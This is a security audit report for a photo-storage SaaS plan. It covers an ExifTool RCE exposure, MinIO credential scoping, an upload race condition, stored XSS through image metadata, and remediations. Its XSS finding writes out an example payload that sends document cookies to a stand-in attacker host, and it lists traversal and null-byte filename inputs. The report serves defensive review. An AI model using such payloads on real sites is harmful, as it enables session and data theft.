# Security Audit — Phase 3: Storage & Media
**Source plan:** `2026-02-25-saas-conversion-phase-3.md` (v3.0)
**Supporting document:** `2026-02-24-saas-conversion-design.md` (v4.0)
**Audit version:** 1
**Auditor:** Lead Cyber-Security Auditor
**Date:** 2026-03-04

---

## Scope & Materials Received

- Phase 3 implementation plan (v3.0): MinIO configuration, upload pipeline, Redis Streams workers, scheduled tasks
- Design document (v4.0): full architecture, auth, RLS, rate limiting, deployment configuration
- Prior critical implementation reviews (v1–v3) — consulted for context

**Scope:** Plan-level security analysis. No source code exists yet; findings flag risks that will manifest at implementation time unless the plan is amended.

---

## Three-Pass Analysis

### Pass 1: Reconnaissance & Attack Surface

**Entry points introduced in Phase 3:**
- `POST /photos/upload` — multipart binary upload (authenticated, Nginx → Spring Boot)
- `GET /api/photos/{id}/status` — polling endpoint (authenticated)
- Redis Streams `photo-jobs` consumer (worker internal)
- Redis Streams `delete-jobs` consumer (worker internal)
- Scheduled jobs: `TrashPurgeScheduler`, `OrphanReconciliationScheduler`, `UnverifiedAccountPurgeScheduler`
- Pre-signed MinIO URL generation (indirect response field)

**Trust boundaries:**
```
Internet → Nginx (TLS) → Spring Boot API → Redis Streams → Worker container
                                       ↘ MinIO (internal Docker network) ↗
                       ↓
                  PostgreSQL (RLS enforced, worker uses restricted role)
```

**Sensitive data flows introduced:**
- Raw image files (up to 200 MB) — user-controlled binary, streamed to MinIO
- EXIF/IPTC/XMP metadata extracted from untrusted files → PostgreSQL JSONB
- `caption`, `title`, `description` (from IPTC/XMP) → `photos` table, returned in API responses
- MinIO `MINIO_ACCESS_KEY` / `MINIO_SECRET_KEY` — present in both API and worker environments
- Pre-signed time-limited URLs — returned in API response, browser fetches directly

**Technology stack security notes:**
- Java 21 / Spring Boot 3: modern, strong defaults for JSON, parameterized queries via JPA
- Redis Streams: internal only, password-protected
- MinIO: private bucket policy, no external port, admin console disabled
- Worker: non-root, `cap_drop: ALL`, `read_only: true`, no inbound ports
- CLI tools (ExifTool, libraw, libvips): called via ProcessBuilder argument arrays

---

### Pass 2: Systematic Vulnerability Hunting

*(Findings are numbered in order of discovery; severity ranking appears in the summary table.)*

---

## Finding #1: ExifTool Version Unspecified — CVE-2021-22204 (Arbitrary Code Execution) Exposure

**Vulnerability:** Unpatched Third-Party Component — OWASP A06
**Severity:** High
**Confidence:** High
**Attack Complexity:** Low

**Location:**
- Plan: Task 3.5, Step 4 — `MetadataExtractor` (ExifTool `-fast2` fallback)
- Design doc: Section 2 ("ExifTool is pinned to a specific version") — no version number given anywhere

**Risk & Exploit Path:**

CVE-2021-22204 is a critical remote code execution vulnerability in ExifTool ≤ 12.23, exploitable via a crafted DjVu image with malicious metadata. It is listed in the CISA Known Exploited Vulnerabilities catalogue and has real-world exploitation history. The attack requires no privilege: an authenticated user uploads a crafted file, the worker runs ExifTool against it, and arbitrary commands execute as the worker process.

While the design doc states "ExifTool is pinned to a specific version," neither the design doc nor the Phase 3 plan specifies a minimum version or the exact Dockerfile `apt-get install` or download URL. Without a pinned version ≥ 12.24, any `apt-get install exiftool` or download from a mirror could install a vulnerable version.

Blast radius within the worker container (which has `cap_drop: ALL`, non-root user, read-only filesystem):
- Environment variables are readable by any process in the container: `MINIO_ACCESS_KEY`, `MINIO_SECRET_KEY`, `WORKER_DB_PASS`, `REDIS_PASSWORD` are all present
- With MinIO credentials, an attacker can read/write/delete **all users' photo objects**
- With `WORKER_DB_PASS`, the attacker can read all `photos` rows (storage keys, user_ids, content hashes) and corrupt metadata
- `/tmp` tmpfs is writable; can stage further tooling

**Evidence / Trace:**

```
Task 3.5, Step 4:
  "ExifTool -fast2 as fallback via ProcessBuilder (same timeout policy as above)"
  → worker downloads {user-uploaded file} to /tmp/{uuid}.{ext}
  → metadata-extractor runs first
  → ExifTool invoked on same file if metadata-extractor insufficient
  → File content is fully attacker-controlled
  → ExifTool ≤ 12.23 parses DjVu metadata → ← RCE
```

Design doc Section 2:
```
"ExifTool is pinned to a specific version, run with -fast2 to limit parsing depth"
 ^^^ no version number specified anywhere in plan or design doc
```

**Remediation:**
- **Primary fix:** Add to Task 3.5 (and the worker Dockerfile specification): `exiftool >= 12.24` is the mandatory minimum. Pin the exact version in the Dockerfile:
  ```dockerfile
  # Verify against https://exiftool.org/history.html — do not use apt without version pin
  ARG EXIFTOOL_VERSION=13.x.x   # pin to latest stable at build time
  RUN curl -fsSL https://exiftool.org/Image-ExifTool-${EXIFTOOL_VERSION}.tar.gz | tar -xz \
    && cd Image-ExifTool-${EXIFTOOL_VERSION} && perl Makefile.PL && make install
  ```
  Alternatively, use the Debian/Ubuntu apt version but verify: `apt-get install libimage-exiftool-perl=X.Y.Z` and confirm X.Y ≥ 12.24.
- **Architectural improvement:** Add a CI step (e.g., Trivy scan of the built worker Docker image) to fail the build on any CVE ≥ HIGH in installed packages.
- **Defense-in-depth:** The existing container hardening (`cap_drop: ALL`, non-root, read-only FS) is good — continue to maintain it. Consider also blocking outbound network from the worker container entirely (no egress rules in Docker Compose) to prevent exfiltration even on compromise.

**References:**
- CVE-2021-22204 (ExifTool ≤ 12.23, CISA KEV)
- CWE-1104: Use of Unmaintained Third-Party Components

---

## Finding #2: Worker MinIO Credentials Not Scoped — Full Bucket Access Violates Least Privilege

**Vulnerability:** Security Misconfiguration — OWASP A05 / Broken Access Control — OWASP A01
**Severity:** Medium
**Confidence:** Confirmed
**Attack Complexity:** Medium (requires worker compromise first)

**Location:**
- Design doc, Section 7 — Docker Compose `worker` service environment block
- Design doc, Section 2 — Worker Database User (Least Privilege) — DB correctly scoped; MinIO not

**Risk & Exploit Path:**

The design doc correctly creates a restricted `worker_db_user` with column-level DB grants. However, the worker's MinIO environment variables are identical to the API's:

```yaml
# API service (design doc):
MINIO_ACCESS_KEY, MINIO_SECRET_KEY

# Worker service (design doc):
MINIO_ENDPOINT, MINIO_ACCESS_KEY, MINIO_SECRET_KEY   ← same credentials
```

A compromised worker (via CVE in libraw, libvips, or ExifTool) can use these credentials to list, download, overwrite, or delete **any object in the MinIO bucket** — not just objects belonging to the photo currently being processed. All users' originals and thumbnails are accessible.

The worker's actual MinIO requirements are narrow:
- Download: `{user_id}/originals/{photo_id}.{ext}` (the specific job's file)
- Upload: `{user_id}/thumbnails/{photo_id}_sm.jpg`, `{user_id}/thumbnails/{photo_id}_md.jpg`
- Delete: none (deletion is the `delete-jobs` consumer's responsibility)

The same credential used by the API to generate pre-signed URLs for all users and manage all objects gives the worker far more than it needs.

**Evidence / Trace:**

```
Design doc Section 7, worker service:
  environment:
    DB_URL, WORKER_DB_USER, WORKER_DB_PASS   # correctly restricted DB role
    MINIO_ENDPOINT, MINIO_ACCESS_KEY, MINIO_SECRET_KEY  # ← same as API, unrestricted

Contrast with design doc Section 2, Worker DB user:
  GRANT SELECT ON photos TO worker_db_user;
  GRANT UPDATE (storage_key, ...) ON photos TO worker_db_user;
  -- Explicitly NOT granted: users, shares, keywords, albums
```

**Remediation:**
- **Primary fix:** Create a dedicated MinIO access key for the worker using MinIO's built-in user/policy management:
  ```
  mc admin user add minio worker-access <strong-secret>
  mc admin policy create minio worker-policy worker-policy.json
  mc admin policy attach minio worker-policy --user worker-access
  ```
  Worker policy restricts to `s3:GetObject`, `s3:PutObject` on `jpt-photos/*` only (no delete, no list-all). The `delete-jobs` consumer (also in worker) additionally needs `s3:DeleteObject` — scope this to delete operations only and consider whether the worker or API should be responsible.
- **Architectural improvement:** Use the MinIO `mc` service account model to issue per-workload access keys. Document the policy JSON in the implementation plan.
- **Defense-in-depth:** MinIO server-side event logging for anomalous bulk operations (already noted as SA#3 monitoring alert in design doc) is the right backstop.

---

## Finding #3: File Extension Source Unspecified — User-Controlled Input Embedded in storage_key and Temp File Path

**Vulnerability:** Input Validation — OWASP A03 / Improper Neutralization
**Severity:** Medium
**Confidence:** Medium (depends on implementation choice not specified in plan)
**Attack Complexity:** Low

**Location:**
- Plan: Task 3.1, Step 3 — bucket path layout
- Plan: Task 3.2, Step 4 — upload endpoint
- Plan: Task 3.5, Step 3 — `ThumbnailGenerator` temp file creation

**Risk & Exploit Path:**

The plan specifies the MinIO storage key format as `{user_id}/originals/{photo_id}.{ext}` and the temp file path as `Files.createTempFile(Path.of("/tmp"), photoId.toString(), "." + ext)`. Neither the upload endpoint description (Task 3.2) nor the StorageService description (Task 3.1) specifies where `ext` is derived. There are two options:
- **Derived from Tika MIME type** (safe — system-controlled, validated, known-good extension like `jpg`, `cr2`, `nef`)
- **Derived from the uploaded filename's extension** (unsafe — user-controlled, unconstrained)

If the user-supplied filename extension is used:
1. A filename like `payload.php` embeds `.php` in the MinIO storage key. MinIO keys are opaque strings; this doesn't execute PHP. However, when Nginx proxies MinIO responses, the `Content-Type` header could be misconfigured to reflect the extension, and some browsers may execute or mishandle certain content types.
2. A filename with a null byte (`payload.jpg\x00.jsp`) could truncate the extension at the OS level in some environments. Java's `Path` API rejects embedded null bytes with `InvalidPathException`, protecting the temp file creation — but this should be tested explicitly.
3. An extremely long extension (e.g., 1000 characters) could produce an oversized storage key and temp file path. Most filesystems support paths up to 4096 bytes; MinIO keys up to 1024 bytes. Violations produce runtime exceptions. No explicit validation gate exists.
4. Extensions containing `../` components (e.g., `../../etc/passwd`) would cause `Files.createTempFile` to throw `InvalidPathException` on the suffix, but the MinIO key could contain traversal sequences (though MinIO treats keys as flat strings, not filesystem paths).

**Evidence / Trace:**

```
Task 3.1, Step 3:
  "{user_id}/originals/{photo_id}.{ext}"   ← ext: source unspecified

Task 3.2, Step 4 (upload flow):
  1. Stream request body; compute SHA-256       ← filename available in multipart headers
  ...
  [no mention of ext extraction or validation]

Task 3.5, Step 3:
  Files.createTempFile(Path.of("/tmp"), photoId.toString(), "." + ext)
  ← ext used as temp file suffix — source still unspecified
```

**Remediation:**
- **Primary fix:** Specify in Task 3.2, Step 4 that `ext` is **always derived from the Tika-detected MIME type** (e.g., `image/jpeg` → `jpg`; `image/x-canon-cr2` → `cr2`), **never from the user-supplied filename**. Maintain a MIME-to-extension allowlist covering supported RAW and JPEG/PNG/TIFF types. If the MIME type has no mapping, reject with 415 Unsupported Media Type before MinIO upload.
- **Input validation:** If the original filename extension must be preserved for user display purposes, store it in a separate `original_filename` column (display-only), never in `storage_key` or any path used for file I/O.
- **Defense-in-depth:** Add a test: `upload_withMaliciousFilenameExtension_usesNormalizedExtension()` asserting that `storage_key` contains only the MIME-derived extension regardless of the uploaded filename.

---

## Finding #4: Orphan Reconciliation Race — In-Progress Uploads Misclassified as Orphans

**Vulnerability:** Business Logic Flaw / TOCTOU Race Condition — OWASP A04
**Severity:** Medium
**Confidence:** High
**Attack Complexity:** High (requires upload coinciding with weekly job)

**Location:**
- Plan: Task 3.2, Step 4 — upload transaction order (Tx 1 inserts row with `storage_key = NULL`; Tx 2 sets `storage_key`)
- Plan: Task 3.6, Step 3 — `OrphanReconciliationScheduler`

**Risk & Exploit Path:**

The plan correctly sequences the upload to insert a DB row before the MinIO upload (ensuring no orphaned MinIO objects). However, between **Tx 1** (DB insert, `storage_key = NULL`) and **Tx 2** (sets `storage_key`), there is a window — potentially several seconds for a 200 MB file on a slow connection — where:
- The MinIO object exists (upload completed at step 4)
- `storage_key IS NULL` in the DB row

The `OrphanReconciliationScheduler` queries:
```
"SELECT storage_key FROM photos WHERE user_id = :userId AND deleted_at IS NULL"
```
returning `Stream<String>`. A row with `storage_key = NULL` contributes a `null` (or empty string) to this stream, which will never match the MinIO object key `{user_id}/originals/{photo_id}.{ext}`. The reconciliation classifies the MinIO object as unreferenced and enqueues it for deletion.

After the worker deletes the object, the upload Tx 2 may still succeed (sets `storage_key` in DB), leaving a DB row pointing to a deleted MinIO object. When `PhotoJobConsumer` processes the job, it downloads from MinIO and fails — `processing_status = 'failed'`.

This is a low-probability event (weekly job, narrow upload window), but for a professional photographer application processing 120 MB RAW files on slow connections, the window can be 10–30 seconds.

**Evidence / Trace:**

```
Task 3.2, Step 4 — Upload transaction order:
  Tx 1: INSERT photos (storage_key = NULL) → commit
  (No Tx) Upload to MinIO   ← MinIO object now exists; DB storage_key = NULL
  Tx 2: UPDATE photos SET storage_key = ? → commit

Task 3.6, Step 3 — OrphanReconciliationScheduler:
  DB side: SELECT storage_key FROM photos WHERE user_id = :userId AND deleted_at IS NULL
  ← returns NULL for in-progress uploads
  MinIO side: listObjects({user_id}/)
  ← object {user_id}/originals/{photo_id}.{ext} returned
  → NULL not in MinIO listing → classified as orphan → enqueued for deletion   ← RACE
```

**Remediation:**
- **Primary fix:** Exclude in-progress uploads from orphan classification. Two options:
  - **Option A (Recommended):** When iterating DB storage keys, also collect `photo_id` values where `storage_key IS NULL AND created_at > now() - INTERVAL '2 hours'`. Parse the `photo_id` from each MinIO object key (`{user_id}/originals/{photo_id}.{ext}`) and skip deletion if the `photo_id` appears in the in-progress set.
  - **Option B:** Add a grace period check: only classify an object as an orphan if its MinIO last-modified timestamp is older than 2 hours. MinIO `listObjects` returns object stat information including last-modified.
- **Add test:** `orphanReconciliation_doesNotDeleteInProgressUploadObjects()` — assert that a MinIO object whose `photo_id` has a DB row with `storage_key = NULL` and `created_at` within the last hour is not enqueued for deletion.

---

## Finding #5: EXIF/IPTC-Derived Text Fields Stored Without Output Encoding Annotation — Stored XSS Vector Staged for Phase 4

**Vulnerability:** Stored Cross-Site Scripting — OWASP A03
**Severity:** Medium
**Confidence:** Confirmed
**Attack Complexity:** Low (once a crafted photo is uploaded)

**Location:**
- Plan: Task 3.5, Step 4 — `MetadataExtractor` populates `caption`, `title`, `description` on `photos` from IPTC/XMP
- Design doc: `photos` table schema — `caption`, `title`, `description` TEXT columns
- Design doc: `search_vector` generated column — indexed content includes these fields

**Risk & Exploit Path:**

A user crafts a JPEG with IPTC Caption set to `<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">`. The worker extracts this value via `metadata-extractor` (or ExifTool fallback) and writes it to `photos.caption` without sanitization. The Phase 3 API returns this value in JSON responses. In Phase 4, if any React component renders `caption`, `title`, or `description` without proper escaping (e.g., using `dangerouslySetInnerHTML` for a rich-text display, or a third-party markdown renderer), the payload executes in the victim's browser session.

The httpOnly JWT cookie is protected, but the XSRF-TOKEN cookie is readable by JS. An XSS payload could exfiltrate the CSRF token and perform CSRF-bypassing authenticated API calls, or exfiltrate other page content (photo metadata, user details).

EXIF/IPTC injection is a real-world attack vector: attackers routinely embed payloads in public JPEG files shared on social networks, knowing they may be processed and redisplayed.

**Evidence / Trace:**

```
Task 3.5, Step 4 — MetadataExtractor:
  "Populate caption, title, description on photos from IPTC/XMP"
  ← values extracted directly from user-uploaded file
  ← stored in TEXT columns via JPA (no sanitization step documented)
  ← no output encoding requirement noted for API response or frontend rendering

Design doc schema:
  photos (... caption TEXT, title TEXT, description TEXT ...)
  search_vector GENERATED ALWAYS AS (
    to_tsvector('english', coalesce(caption,'') || ' ' || coalesce(title,'') || ...)
  )
  ← tsvector is safe (tokenizes, does not preserve markup)
  ← but the raw TEXT columns are returned in API responses
```

**Remediation:**
- **Primary fix (Phase 3):** Add a sanitization step in `MetadataExtractor` before writing to DB. Use OWASP Java HTML Sanitizer or strip all HTML/control characters from IPTC/XMP text fields before storage:
  ```java
  String safe = Sanitizers.FORMATTING.sanitize(rawValue);  // OWASP Java HTML Sanitizer
  // or simpler: strip all tags
  String safe = Jsoup.clean(rawValue, Safelist.none());
  ```
  Add tests: `metadataExtractor_stripsHtmlTagsFromIptcCaption()` and similar.
- **Architectural improvement (Phase 4 gate):** Add a note to the Phase 4 frontend plan: "Never render `caption`, `title`, `description` via `dangerouslySetInnerHTML`. Use React text nodes only."
- **Defense-in-depth:** Content Security Policy (already in design doc v3.0 as `[M2]`) should include `script-src 'self'` to block inline script execution. Confirm Phase 4 CSP blocks inline scripts even if style-src uses `'unsafe-inline'`.

---

## Finding #6: GET /api/photos/{id}/status — Ownership Validation Not Tested in Phase 3

**Vulnerability:** Broken Access Control / IDOR — OWASP A01
**Severity:** Medium
**Confidence:** Medium (authorization infrastructure exists from prior phases; specific test gap)
**Attack Complexity:** Medium

**Location:**
- Plan: Task 3.2 — upload endpoint introduces the status polling contract
- Design doc: Section 5 — "The UI polls `/api/photos/{id}/status` every 3 seconds post-upload"
- Plan tests: Task 3.2, Step 3 — 8 test stubs; none covers IDOR on the status endpoint

**Risk & Exploit Path:**

`GET /api/photos/{id}/status` is introduced in Phase 3. The design doc states resource ownership is checked at the service layer for all endpoints (`photo.userId == currentUser.id`), and the prior phase's infrastructure enforces this generically. However, Phase 3 introduces this specific endpoint with no test asserting cross-user access is rejected.

If ownership is accidentally omitted for this endpoint (easy oversight for a "lightweight" status check), any authenticated user who can guess or enumerate another user's `photo_id` (a UUID v4 — not directly guessable, but potentially leaked via error messages, logs, or future IDOR in another endpoint) can poll the processing status of other users' photos. The information disclosed is minimal (`processing_status`), but it confirms existence of another user's photo and reveals when it finishes processing — a privacy violation and potential timing oracle for more targeted attacks.

**Evidence / Trace:**

```
Task 3.2, Step 3 — failing tests:
  void upload_streamsToMinioAndEnqueuesJob() { ... }
  void upload_rejectsDuplicateContentHash() { ... }
  void upload_rejectsWhenQuotaExceeded() { ... }
  void upload_concurrentDuplicatesHandledByDbConstraint() { ... }
  void upload_rejectsUnverifiedUser() { ... }
  void upload_allowsVerifiedUser() { ... }
  void upload_succeedsAfterSoftDeletedDuplicate() { ... }
  void upload_minioFailureRollsBackQuotaAndPhotoRow() { ... }
  ← No test: photoStatus_anotherUsersPhotoReturns403()   ← MISSING
```

**Remediation:**
- **Primary fix:** Add the following test stub to Task 3.2, Step 3:
  ```java
  @Test
  void photoStatus_anotherUsersPhotoReturns403() {
      // assert GET /api/photos/{id}/status returns 403 when id belongs to a different user
  }
  ```
- **Architectural improvement:** Confirm the ownership check is enforced at the service layer, not only in the upload path. If a generic `@PreAuthorize` or service-level check exists from Phase 2, cite it explicitly in the Task 3.2 implementation notes.

---

## Finding #7: tmpfs Size Conflict Between Design Doc (512M) and Plan (1G)

**Vulnerability:** Security Misconfiguration / Availability — OWASP A05
**Severity:** Low
**Confidence:** Confirmed
**Attack Complexity:** Low

**Location:**
- Design doc, Section 7, worker service: `/tmp:size=512M`
- Plan, Task 3.5, Step 3 (v2.0 change MI-6): `/tmp:size=1g,mode=1777`

**Risk & Exploit Path:**

The plan correctly upgraded the tmpfs size to 1 GB, analyzing that 120 MB RAW + processing overhead requires more than 512 MB. However, the design doc (the authoritative deployment reference) still specifies 512 MB. At implementation time, if the engineer follows the design doc's Compose snippet rather than the Phase 3 plan's note, the deployed tmpfs will be 512 MB.

Under this configuration: a user uploads two concurrent files totaling >512 MB (e.g., two 300 MB medium-format RAW files), the worker's temp file creation fails mid-processing, the job fails with an IOException, and the retry loop begins. A targeted attacker could keep uploading large files (within their quota) to keep the worker in a failure/retry loop — a targeted single-user DoS of their own job queue, or a broader DoS if the worker handles multiple users.

**Evidence / Trace:**

```
Design doc Section 7:
  worker:
    tmpfs:
      - /tmp:size=512M    # Working directory for image processing

Plan Task 3.5, Step 3 (MI-6 change from review 2):
  tmpfs:
    - /tmp:size=1g,mode=1777
  Rationale: single-threaded consumer; 1 job × 120 MB RAW = 120 MB needed;
  1 GB provides ample headroom   ← correct analysis; design doc not updated
```

**Remediation:**
- **Primary fix:** Update the design doc Section 7 worker service `tmpfs` to `- /tmp:size=1g,mode=1777` to match the Phase 3 plan's corrected value. The design doc is the deployment source of truth; it must be consistent.
- **Defense-in-depth:** Add a worker startup check that verifies available tmpfs space exceeds a minimum threshold (e.g., 512 MB free) and logs a warning if not.

---

## Finding #8: Native Library Versions (libraw, libvips, ExifTool) Not Pinned in Plan

**Vulnerability:** Vulnerable and Outdated Components — OWASP A06
**Severity:** Low
**Confidence:** High
**Attack Complexity:** Low (passive — affects build reproducibility)

**Location:**
- Plan: Task 3.5 — references libraw, libvips, ExifTool; no version pins specified
- Design doc: Section 2 — "ExifTool is pinned to a specific version" (no version given)

**Risk & Exploit Path:**

The worker Dockerfile will install libraw, libvips, and ExifTool. Without version pins:
1. `apt-get install libraw-dev libvips-tools exiftool` resolves to whatever versions are current in the Debian/Ubuntu apt mirror at build time — non-reproducible builds.
2. Security patches cannot be verified against a known baseline.
3. A compromised apt mirror (supply chain attack) could install a backdoored version.
4. CI/CD image rebuilds on new base OS images could silently upgrade to an incompatible or vulnerable version.

libraw has had several heap-overflow CVEs (e.g., related to parsing specific RAW makers). libvips has had CVEs related to parsing TIFF and WebP. These are significantly safer than ImageMagick (as noted in the design doc), but they still process fully attacker-controlled binary data.

**Remediation:**
- **Primary fix:** Add to Task 3.5 (or the worker Dockerfile specification note): list the exact package versions for libraw, libvips, and ExifTool to pin at implementation time. Use `apt-get install libraw-dev=X.Y.Z libvips-tools=X.Y.Z` with versions verified against the security tracker.
- **Architectural improvement:** Add a Trivy or Grype scan of the built worker Docker image to CI (the design doc mentions artifact signing in SA#11/CR#3 but not vulnerability scanning). A failing scan on CRITICAL/HIGH CVEs in the worker image should block deployment.
- **Defense-in-depth:** Pin the worker Dockerfile `FROM` base image to a specific digest (e.g., `FROM debian:bookworm-slim@sha256:...`) for reproducible builds.

---

### Pass 3: Cross-Cutting & Compositional Analysis

**Chain A: Malicious File → ExifTool RCE → Full MinIO Exfiltration (Finding #1 + #2)**

The most concerning attack chain in this plan: an authenticated user uploads a crafted file → ExifTool RCE (F#1) → worker environment variables read → `MINIO_ACCESS_KEY/SECRET_KEY` present → attacker downloads all users' originals and thumbnails (F#2). The worker container's hardening (`cap_drop`, non-root, read-only FS) limits persistence and lateral movement but does not prevent environment variable reading or outbound MinIO API calls (MinIO is on the internal Docker network, accessible from the worker).

Mitigation requires **both** fixes: pin ExifTool (eliminates RCE) **and** scope MinIO credentials (limits blast radius if any other CLI tool has a future CVE).

**Chain B: EXIF Injection + Missing Frontend Escaping → Stored XSS → CSRF Token Theft (Finding #5)**

User crafts photo → IPTC payload stored in DB (F#5) → Phase 4 renders it unsanitized → XSS executes → reads `XSRF-TOKEN` cookie → performs authenticated actions as victim. This chain is dormant in Phase 3 but becomes active in Phase 4. Phase 3 is the correct place to add sanitization because it is the write path — fixing it in Phase 4 at render time is harder and error-prone across multiple UI components.

**Chain C: Orphan Reconciliation + Large-File Upload → Data Loss (Finding #4)**

Not a security attack in the traditional sense but a business logic flaw with data integrity impact: a large RAW upload during the Sunday 4 AM reconciliation window loses its MinIO object, causing permanent `processing_status = 'failed'` with no recovery. The user's quota is decremented (Tx 1) but the file is gone. User experience: upload reported as failed, quota consumed, no recovery path in Phase 3.

**Defense-in-depth assessment:**

The plan exhibits strong security fundamentals: RLS with SET LOCAL (transaction-scoped), SHA-256 share token hashing, httpOnly JWT cookies, CSRF double-submit, Tika pre-validation, ProcessBuilder argument arrays, worker DB least privilege, account lockout, email verification gate, and distributed scheduler locking. The identified issues are gaps in an otherwise well-designed system, not fundamental architectural flaws.

---

## 1. Executive Summary

Phase 3 introduces the highest-risk processing pipeline in the application: user-controlled binary files are downloaded by a worker container, passed through multiple native binary parsers (Apache Tika, libraw, libvips, metadata-extractor, ExifTool), and written back to shared storage. The design makes sound choices — container hardening, worker DB least privilege, ProcessBuilder argument arrays, Tika pre-validation — but two gaps undermine the defense-in-depth model.

The most actionable risk is **ExifTool version specification** (Finding #1). CVE-2021-22204 is confirmed-exploitable via a crafted DjVu file, is in the CISA KEV catalogue, and requires only an authenticated upload. The plan relies on ExifTool being "pinned to a specific version" but never names that version. Combined with the worker having full MinIO bucket credentials (Finding #2), a successful exploit exposes all users' photo libraries. Both findings are straightforward to remediate before any code is written.

The remaining findings are medium-severity design gaps: user-controlled file extensions embedded in storage keys without validation (Finding #3), an orphan reconciliation race that can delete in-progress uploads (Finding #4), EXIF-injected XSS payloads silently staged for Phase 4 (Finding #5), and a missing IDOR test for the status polling endpoint (Finding #6). None of these require architectural changes — all are addressable with specification additions and test stubs in the current plan.

The plan is **not ready to implement** in its current form. Findings #1 and #2 must be resolved before the worker Dockerfile is written; Findings #3–6 must be resolved before their respective implementation steps.

---

## 2. Findings Summary Table

| # | Title | Category | Severity | Confidence | Similar Instances | Status |
|---|-------|----------|----------|------------|-------------------|--------|
| 1 | ExifTool version unspecified — CVE-2021-22204 exposure | A06 | High | High | 1 (ExifTool only) | **BLOCK** |
| 2 | Worker MinIO credentials not scoped — full bucket access | A05/A01 | Medium | Confirmed | 0 | Fix before impl |
| 3 | File extension source unspecified — user input in storage key | A03 | Medium | Medium | 1 (libraw/libvips also receive ext) | Fix before impl |
| 4 | Orphan reconciliation race — in-progress uploads misclassified | A04 | Medium | High | 0 | Fix before impl |
| 5 | EXIF/IPTC text stored without sanitization — stored XSS vector | A03 | Medium | Confirmed | 3 (caption, title, description) | Fix before impl |
| 6 | GET /photos/{id}/status — ownership check not tested | A01 | Medium | Medium | 0 | Fix before impl |
| 7 | tmpfs size conflict between design doc and plan | A05 | Low | Confirmed | 0 | Fix opportunistically |
| 8 | Native library versions not pinned in Dockerfile spec | A06 | Low | High | 3 (libraw, libvips, ExifTool) | Fix opportunistically |

---

## 3. Security Quality Score (SQS)

| Finding | Severity | Deduction |
|---------|----------|-----------|
| #1 | High | −20 |
| #2 | Medium | −8 |
| #3 | Medium | −8 |
| #4 | Medium | −8 |
| #5 | Medium (3 similar instances → grouped) | −8 |
| #6 | Medium | −8 |
| #7 | Low | −2 |
| #8 | Low (3 similar → grouped) | −2 |

**Raw score:** 100 − 20 − 8 − 8 − 8 − 8 − 8 − 2 − 2 = **36/100**

**Hard gates triggered:** YES
- Finding #1: CVE-2021-22204 is listed in the CISA Known Exploited Vulnerabilities catalogue. Plan does not specify a version that excludes it.

**Posture: BLOCK — Unacceptable. Do not implement until Findings #1 and #2 are resolved.**

---

## 4. Positive Security Observations

1. **Worker database least privilege is excellent.** Column-level grants on a separate `worker_db_user` role, with explicit denial of `users`, `shares`, and `albums` tables, is production-grade. The plan correctly documents both the grants and the intentional exclusions.

2. **ProcessBuilder argument arrays throughout.** Every CLI invocation (libraw, libvips, ExifTool) is specified to use explicit argument arrays, never shell string concatenation. Files are referenced by UUID storage keys only. This eliminates the entire class of command injection via crafted filenames.

3. **Transaction ordering designed around security.** The upload flow (DB insert before MinIO upload, compensating transaction with critical-severity logging, TrashPurgeScheduler null-key recovery) reflects careful thinking about atomic consistency and failure blast radius. Few plans at this level of detail address double-failure paths.

4. **Share token security is correctly designed.** 256-bit `SecureRandom` tokens, `SHA-256(token)` stored in DB (plaintext never persisted), 30-day default expiry, and Nginx rate limiting on the share endpoint are all correct. A compromised DB dump does not expose active share links.

5. **XAUTOCLAIM idle-time rationale is security-aware.** The plan explicitly justifies the 30-minute XAUTOCLAIM idle time as "safely exceeds the worst-case RAW processing time," preventing healthy workers from having their in-flight messages stolen and preventing duplicate concurrent processing. This kind of adversarial reasoning about the stream's state machine is a security-conscious design choice.

---

## 5. Prioritized Remediation Roadmap

**1. Finding #1 — ExifTool CVE-2021-22204**
- Why first: CISA KEV hard gate, exploitable by any authenticated user, RCE in file-processing container
- Action: Specify `exiftool >= 12.24` in Task 3.5 and the worker Dockerfile spec; add Trivy scan to CI
- Effort: **Quick Win** (add two lines to plan; one Dockerfile directive)
- Owner: Security Team / Backend

**2. Finding #2 — Worker MinIO Least Privilege**
- Why second: Directly amplifies F#1 blast radius; also standalone risk for any future native library CVE
- Action: Define a `worker-policy.json` MinIO IAM policy scoped to `GetObject`/`PutObject` (and `DeleteObject` for delete-jobs) on `jpt-photos/*`; add `WORKER_MINIO_ACCESS_KEY`, `WORKER_MINIO_SECRET_KEY` env vars to Compose
- Effort: **Moderate** (new MinIO user provisioning step; update Compose; update Task 3.1 StorageService to use separate client beans)
- Owner: Backend / DevOps

**3. Finding #5 — EXIF/IPTC Stored XSS Vector**
- Why third: Easiest to fix at Phase 3 (write path); painful to fix comprehensively in Phase 4 (render path across all components)
- Action: Add OWASP Java HTML Sanitizer to worker module; strip/sanitize `caption`/`title`/`description` in `MetadataExtractor` before DB write; add one test per field
- Effort: **Quick Win** (add one library; ~5 lines per field)
- Owner: Backend

**4. Finding #3 — File Extension Source Unspecified**
- Why fourth: Prevents ambiguous implementation; correct derivation (MIME-based) is architecturally cleaner and eliminates a class of input confusion
- Action: Add one paragraph to Task 3.2 Step 4 specifying ext is derived from Tika MIME type via allowlist; add `upload_withMaliciousFilenameExtension_usesNormalizedExtension()` test
- Effort: **Quick Win** (specification change only)
- Owner: Backend

**5. Finding #4 — Orphan Reconciliation Race**
- Why fifth: Low probability but high impact (permanent data loss for affected upload); fix is contained to OrphanReconciliationScheduler
- Action: Add in-progress upload exclusion logic to Task 3.6 Step 3 (Option A: parse photo_id from object key, skip if photo_id has null storage_key and created_at < 2 hours)
- Effort: **Moderate** (new query + filter logic in scheduler)
- Owner: Backend
